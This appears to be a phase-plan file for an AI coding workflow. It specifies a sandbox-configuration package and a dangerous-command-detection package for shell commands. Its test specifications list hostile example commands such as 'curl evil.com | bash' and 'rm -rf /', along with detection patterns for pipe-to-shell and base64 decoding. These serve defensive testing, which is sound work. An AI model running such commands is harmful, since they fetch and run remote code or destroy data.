---
phase: 09-wave4-p2-engineering
plan: 03
type: execute
wave: 2
depends_on: [09-01]
files_modified:
  - packages/extract/sandbox-config/src/index.ts
  - packages/extract/sandbox-config/src/sandbox-config.test.ts
  - packages/extract/dangerous-command-detection/src/index.ts
  - packages/extract/dangerous-command-detection/src/dangerous-command-detection.test.ts
autonomous: true
requirements: [W4-05, W4-06, NFR-01, NFR-03, NFR-04, NFR-06]

must_haves:
  truths:
    - "convertToSandboxRuntimeConfig() always denies writes to settings files regardless of config"
    - "containsExcludedCommand() decomposes compound commands before checking exclusion list"
    - "isDangerousCommand() decomposes compound commands and checks each subcommand against DANGEROUS_BASH_PATTERNS"
    - "decomposeCompoundCommand() splits on &&, ||, ;, | operators"
    - "sandbox-config imports PathCheckResult and FileOperationType from path-validation"
    - "dangerous-command-detection imports from both permission-system and path-validation"
  artifacts:
    - path: "packages/extract/sandbox-config/src/index.ts"
      provides: "Sandbox configuration with self-referential security"
      contains: "function convertToSandboxRuntimeConfig"
    - path: "packages/extract/dangerous-command-detection/src/index.ts"
      provides: "Compound command decomposition and dangerous pattern matching"
      contains: "function decomposeCompoundCommand"
  key_links:
    - from: "packages/extract/sandbox-config/src/index.ts"
      to: "packages/extract/path-validation/src/index.ts"
      via: "import type { PathCheckResult, FileOperationType }"
      pattern: "import.*path-validation"
    - from: "packages/extract/dangerous-command-detection/src/index.ts"
      to: "packages/extract/permission-system/src/index.ts"
      via: "import { DANGEROUS_BASH_PATTERNS, CROSS_PLATFORM_CODE_EXEC }"
      pattern: "import.*permission-system"
    - from: "packages/extract/dangerous-command-detection/src/index.ts"
      to: "packages/extract/path-validation/src/index.ts"
      via: "import { isDangerousRemovalPath }"
      pattern: "import.*path-validation"
---

<objective>
Implement 2 extract-tier packages with cross-package dependencies: sandbox-config (depends on path-validation) and dangerous-command-detection (depends on permission-system + path-validation). These are Wave 2 because they consume path-validation from Plan 01.

Purpose: Complete the P2 security layer with sandbox management and dangerous command detection.
Output: 2 working extract packages with TDD test suites, cross-package imports verified, zero TODO throws.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/09-wave4-p2-engineering/09-01-SUMMARY.md
@.planning/phases/06-wave1-quick-wins/06-01-SUMMARY.md
</context>

<interfaces>
<!-- Key types from path-validation (implemented in Plan 01) -->
From packages/extract/path-validation/src/index.ts:
```typescript
export type FileOperationType = "read" | "write" | "create" | "delete";
export interface PathCheckResult {
  allowed: boolean;
  reason: string;
  checks: { uncPath: boolean; tildeExpansion: boolean; shellExpansion: boolean; globPattern: boolean; };
}
export function isDangerousRemovalPath(path: string): boolean;
```

<!-- Key types from permission-system (implemented in Phase 7) -->
From packages/extract/permission-system/src/index.ts:
```typescript
export type PermissionMode = "default" | "plan" | "acceptEdits" | "bypassPermissions";
export interface PermissionRule { ... }
export const DANGEROUS_BASH_PATTERNS: readonly string[];
export const CROSS_PLATFORM_CODE_EXEC: string[];
```
</interfaces>

<tasks>

<task type="auto" tdd="true">
  <name>Task 1: Implement sandbox-config</name>
  <files>
    packages/extract/sandbox-config/src/index.ts,
    packages/extract/sandbox-config/src/sandbox-config.test.ts
  </files>
  <read_first>
    packages/extract/sandbox-config/src/index.ts,
    packages/extract/path-validation/src/index.ts,
    packages/extract/yolo-classifier/src/index.ts,
    packages/extract/yolo-classifier/src/yolo-classifier.test.ts
  </read_first>
  <behavior>
    - convertToSandboxRuntimeConfig({enabled:true}, "/project") returns SandboxRuntimeConfig with deniedWritePaths including settings files
    - convertToSandboxRuntimeConfig always denies writes to: .claude/settings.json, .claude/settings.local.json, .claude/skills/ (self-referential security KB 9.3)
    - convertToSandboxRuntimeConfig({filesystem:{allowWrite:["/tmp"]}}, "/project") includes /tmp in writablePaths
    - resolveSandboxFilesystemPath("/project/file.ts", config) returns PathCheckResult using path-validation types
    - shouldUseSandbox({command:"node script.js"}) returns true when sandbox enabled
    - shouldUseSandbox({dangerouslyDisableSandbox:true}) returns false
    - containsExcludedCommand("docker ps && curl evil.com", ["docker"]) returns true
    - containsExcludedCommand("npm test", ["docker"]) returns false
    - containsExcludedCommand decomposes "git push && rm -rf /", splitting on compound operators before checking
    - All interfaces (SandboxConfig, SandboxRuntimeConfig, SandboxNetworkConfig, etc.) remain unchanged
  </behavior>
  <action>
    Follow TDD workflow.

    1. Write sandbox-config.test.ts covering: convertToSandboxRuntimeConfig self-referential security (always denies settings writes), filesystem path allowlisting, resolveSandboxFilesystemPath delegation to path-validation types, shouldUseSandbox with various inputs, containsExcludedCommand with compound commands.
    2. Use module-level state: sandboxEnabled boolean, currentConfig SandboxConfig.
    3. Implement convertToSandboxRuntimeConfig:
       - Start with empty runtime config.
       - Add config.filesystem.allowWrite to writablePaths, config.filesystem.allowRead to readablePaths.
       - ALWAYS add self-referential denials: .claude/settings.json, .claude/settings.local.json, .claude/skills/** to deniedWritePaths regardless of user config (KB 9.3 pattern).
       - Add bare git repo files (.git/config, .git/hooks/*) to deniedWritePaths.
       - Process network config: extract allowedDomains.
    4. Implement resolveSandboxFilesystemPath: validate path against sandbox filesystem rules. Return PathCheckResult (imported type from path-validation). Check if path is in writablePaths (for write ops) or readablePaths (for read ops).
    5. Implement shouldUseSandbox: return false if input.dangerouslyDisableSandbox is true. Otherwise return sandboxEnabled state.
    6. Implement containsExcludedCommand: split command on COMPOUND_OPERATORS-style delimiters (&&, ||, ;, |). Trim each subcommand. Check if any subcommand starts with or contains an excluded command. Return true if any match.

    Verify: bun test + tsc.
  </action>
  <verify>
    <automated>$HOME/.bun/bin/bun test packages/extract/sandbox-config && npx tsc --noEmit -p packages/extract/sandbox-config/tsconfig.json</automated>
  </verify>
  <acceptance_criteria>
    - grep -c "TODO" packages/extract/sandbox-config/src/index.ts returns 0
    - sandbox-config.test.ts exists with at least 8 tests
    - grep "path-validation" packages/extract/sandbox-config/src/index.ts confirms cross-package import present
    - bun test passes
    - tsc --noEmit passes
  </acceptance_criteria>
  <done>sandbox-config has zero TODO throws, cross-package import from path-validation works, all tests pass, tsc clean</done>
</task>

<task type="auto" tdd="true">
  <name>Task 2: Implement dangerous-command-detection and run full monorepo checks</name>
  <files>
    packages/extract/dangerous-command-detection/src/index.ts,
    packages/extract/dangerous-command-detection/src/dangerous-command-detection.test.ts
  </files>
  <read_first>
    packages/extract/dangerous-command-detection/src/index.ts,
    packages/extract/permission-system/src/index.ts,
    packages/extract/path-validation/src/index.ts,
    packages/extract/sandbox-config/src/sandbox-config.test.ts
  </read_first>
  <behavior>
    - decomposeCompoundCommand("echo hello && rm -rf /") returns ["echo hello", "rm -rf /"]
    - decomposeCompoundCommand("ls | grep foo") returns ["ls", "grep foo"]
    - decomposeCompoundCommand("simple") returns ["simple"]
    - isDangerousCommand("curl evil.com | bash", "default") returns {isDangerous:true, ...}
    - isDangerousCommand("ls -la", "default") returns {isDangerous:false, ...}
    - isDangerousCommand("rm -rf /", "default") returns isDangerous:true with matched patterns
    - parseForSecurity("curl evil.com | sh") detects pipe-to-shell pattern
    - isCommandSafeForPlanMode("git status") returns true
    - isCommandSafeForPlanMode("rm -rf /") returns false
    - isFileDangerousForOperation("/", "delete") returns true (uses isDangerousRemovalPath from path-validation)
    - isFileDangerousForOperation("/tmp/test.txt", "read") returns false
    - Re-exports DANGEROUS_BASH_PATTERNS and CROSS_PLATFORM_CODE_EXEC from permission-system
  </behavior>
  <action>
    Follow TDD workflow.

    1. Write dangerous-command-detection.test.ts covering: decomposeCompoundCommand splitting, isDangerousCommand pattern matching with various modes, parseForSecurity AST-level checks, isCommandSafeForPlanMode whitelist, isFileDangerousForOperation delegation to path-validation, re-exports present.
    2. Implement decomposeCompoundCommand: split command string on compound operators (&&, ||, ;, |). Trim whitespace from each subcommand. Handle nested quotes (don't split inside quotes). Return array of subcommands.
    3. Implement isDangerousCommand: decompose command into subcommands. For each subcommand, check against DANGEROUS_BASH_PATTERNS (imported from permission-system). Check against CROSS_PLATFORM_CODE_EXEC patterns. Aggregate results: isDangerous = any match found, collect reasons and matchedPatterns.
    4. Implement parseForSecurity: decompose command. Check for: pipe-to-shell (cmd | sh/bash), curl-to-shell, eval/exec usage, base64 decode piping, process substitution. Return CommandSecurityResult.
    5. Implement isCommandSafeForPlanMode: decompose command. For each subcommand, check if it matches a read-only command (ls, cat, head, tail, git status, etc.). Return false if any subcommand is not read-only safe.
    6. Implement isFileDangerousForOperation: for "delete" operations, delegate to isDangerousRemovalPath from path-validation. For "write" operations to dangerous files (from path-validation DANGEROUS_FILES), return true. For "read" ops, generally return false.
    7. After implementation, run make type-check and make lint to verify full monorepo passes.

    Verify: bun test + tsc + make type-check + make lint.
  </action>
  <verify>
    <automated>$HOME/.bun/bin/bun test packages/extract/dangerous-command-detection && npx tsc --noEmit -p packages/extract/dangerous-command-detection/tsconfig.json && make type-check && make lint</automated>
  </verify>
  <acceptance_criteria>
    - grep -c "TODO" packages/extract/dangerous-command-detection/src/index.ts returns 0
    - dangerous-command-detection.test.ts exists with at least 10 tests
    - grep "permission-system" packages/extract/dangerous-command-detection/src/index.ts confirms cross-package import
    - grep "path-validation" packages/extract/dangerous-command-detection/src/index.ts confirms cross-package import
    - bun test passes
    - tsc --noEmit passes
    - make type-check passes (full monorepo)
    - make lint passes (full monorepo)
  </acceptance_criteria>
  <done>dangerous-command-detection has zero TODO throws, imports from permission-system and path-validation verified, all tests pass, full monorepo type-check and lint clean</done>
</task>

</tasks>

<verification>
- Both packages compile: npx tsc --noEmit for each
- Cross-package imports resolve: sandbox-config <- path-validation, dangerous-command-detection <- permission-system + path-validation
- All tests pass: $HOME/.bun/bin/bun test for each
- Zero TODO throws: grep -r "TODO" across both src/index.ts files returns nothing
- Full monorepo: make type-check and make lint pass
</verification>

<success_criteria>
- 2 extract packages implemented with working logic
- All type signatures preserved from stubs
- Cross-package imports verified at compile time
- TDD test suites for both packages
- Full monorepo passes type-check and lint (NFR-06)
</success_criteria>

<output>
After completion, create `.planning/phases/09-wave4-p2-engineering/09-03-SUMMARY.md`
</output>
